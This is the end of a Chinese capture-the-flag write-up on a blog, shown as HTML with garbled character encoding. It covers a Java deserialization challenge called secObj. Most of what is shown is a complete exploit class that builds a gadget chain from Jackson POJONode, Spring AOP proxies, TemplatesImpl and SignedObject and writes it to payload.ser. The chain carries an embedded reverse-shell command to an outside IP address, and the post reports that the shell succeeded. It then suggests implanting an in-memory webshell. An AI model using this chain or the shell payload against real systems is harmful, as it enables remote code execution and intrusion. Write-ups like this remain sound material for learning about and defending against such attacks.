<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * POJONode çš„çˆ¶ç±» BaseJsonNodeï¼Œå­˜åœ¨ toString()</span></span><br><span class="line"><span class="comment"> * å½“è°ƒç”¨ POJONode.toString() ,</span></span><br><span class="line"><span class="comment"> * å°±ä¼šéå† POJONode åˆå§‹åŒ–æ—¶çš„ Object ä¸­çš„æ‰€æœ‰ getter æ–¹æ³•</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Chain2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// åˆ é™¤ BaseJsonNode#writeReplace æ–¹æ³•</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass0</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass0.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass0.removeMethod(writeReplace);</span><br><span class="line">        ctClass0.toClass();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æ¶æ„å­—èŠ‚ç </span></span><br><span class="line">        <span class="type">byte</span>[] bytes = Utils.getEvilPayload(<span class="string">&quot;sh -i &gt;&amp; /dev/tcp/149.88.74.46/7733 0&gt;&amp;1&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Utils.setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Utils.setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Utils.setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¾ç½®åŠ¨æ€ä»£ç†</span></span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>(Templates.class);</span><br><span class="line">        advisedSupport.setTarget(templates);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>)</span><br><span class="line">                .getDeclaredConstructor(AdvisedSupport.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(</span><br><span class="line">                ClassLoader.getSystemClassLoader() ,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125; ,</span><br><span class="line">                invocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxy);</span><br><span class="line">        <span class="comment">// ä½¿ç”¨åå°„ä¿®æ”¹ val å±æ€§ï¼Œé¿å…æ„é€ æ–¹æ³•æ—¶è§¦å‘ toString()</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        Utils.setValue(bad, <span class="string">&quot;val&quot;</span>, pojoNode);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç”Ÿæˆå…¬é’¥</span></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">keyPairGenerator</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(</span><br><span class="line">                bad,</span><br><span class="line">                keyPair.getPrivate(),</span><br><span class="line">                Signature.getInstance(<span class="string">&quot;DSA&quot;</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">outerNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(outerNode);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;aaa&quot;</span>));</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> Utils.makeMap(h1 ,h2);</span><br><span class="line"></span><br><span class="line">        Utils.serialize(hashMap, <span class="string">&quot;payload.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆåŠŸå¼¹å›shellï¼Œ</p>
<a class="simple-lightbox" target="_blank" rel="noopener" href="https://blog-1317773990.cos.ap-chengdu.myqcloud.com/image-20241109152950063.png"><img   src="/project/images/loading.svg" data-src="https://blog-1317773990.cos.ap-chengdu.myqcloud.com/image-20241109152950063.png"  alt="image-20241109152950063" style="zoom:50%;"  lazyload></a>

<p>ä½†æ˜¯åŸæœ¬çš„é¢˜ç›®æ˜¯ä¸å‡ºç½‘çš„ï¼Œé‚£å°±å†™ä¸ªå†…å­˜é©¬å°±å®Œäº†ï¼›</p>
<p><strong>èµç¾å¤§å¤´</strong></p>

        </div>
          
        <div class="top-div">
          <ol class="top-box"><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#2023%E6%B5%99%E6%B1%9F%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B-secObj"><span class="top-box-text">2023æµ™æ±Ÿå¤§å­¦ç”Ÿçœèµ›å†³èµ› secObj</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="top-box-text">å‰ç½®çŸ¥è¯†</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E9%93%BE%E5%AD%90"><span class="top-box-text">é“¾å­</span></a></li></ol></li></ol></li></ol>
        </div>
          
      </div>
    </div>

    
      <div class="next-post">
        <a class="purple-link" href="/2024/11/09/2021%E4%B8%9C%E5%8D%8E%E6%9D%AF(ezgadgets.jar)/">
          <h3 class="post-title">
            ä¸‹ä¸€ç¯‡ï¼š2021ä¸œåæ¯(ezgadgets.jar)
          </h3>
        </a>
      </div>
    
  </div>










<footer>
<div class="site-footer">
  <div class="social-container">
    
      
        <a aria-label="è·³è½¬è‡³github" href="https://github.com/y1shiny1shin" target="_blank">
          <i class="icon icon-github"></i>
        </a>
      
    
      
    
      
    
      
    
      
    
      
        <a aria-label="è·³è½¬è‡³email" href="y1shin@163.com" target="_blank">
          <i class="icon icon-email"></i>
        </a>
      
    
      
    
  </div>
  
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
  
  
  
  
  
  
</div>
</footer>


      </div>
    </div>
    
<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"photo_zoom":"simple-lightbox"}}; window.is_post = true; </script>

<script src="/js/main.js"></script>






  <script src="/js/simple-lightbox.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {new SimpleLightbox('.post-detail .simple-lightbox', {fileExt: false,captionsData:'alt'});});</script></body>
</html>

